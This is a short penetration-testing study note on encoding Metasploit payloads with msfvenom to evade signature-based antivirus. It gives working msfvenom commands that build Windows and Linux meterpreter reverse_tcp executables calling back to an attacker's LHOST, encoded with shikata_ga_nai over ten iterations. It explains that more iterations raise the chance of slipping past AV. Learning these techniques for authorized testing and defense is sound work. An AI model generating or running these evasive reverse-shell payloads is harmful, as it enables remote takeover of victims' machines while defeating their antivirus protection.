---
up: "[[Client-Side Attacks]]"
---

# Encoding Payloads with MSFvenom

- Payloads must be transferred and stored on the client system
- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables
- Older signature based AV solutions can be evaded by encoding our payloads
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature

## Shellcode

- a Shellcode is a piece of code typically used as a payload for exploitation
- It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system

## Demonstration

```bash
# list encoders
msfvenom --list encoders
# encode payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > encodedx86.exe
```

- Payload can be encoded with as much iteration as needed
- The more iterations the more chances to evade AVs

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
```

- any number after 10 iterations is not giving much more advantage

Same for linux:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f elf > encodedx86
```
